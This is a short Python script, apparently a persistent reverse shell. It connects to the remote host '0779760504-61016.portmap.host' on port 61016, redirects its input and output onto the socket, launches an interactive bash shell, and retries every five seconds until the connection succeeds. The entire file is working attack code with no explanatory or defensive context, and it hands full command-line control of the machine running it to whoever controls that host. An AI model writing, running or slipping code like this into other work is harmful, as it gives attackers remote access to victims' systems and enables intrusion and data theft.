import socket
import subprocess
import os
import time

target_host = "0779760504-61016.portmap.host"
target_port = 61016

while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_host, target_port))

    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    p = subprocess.call(["/bin/bash", "-i"])
    break
  except Exception:
    time.sleep(5)
    
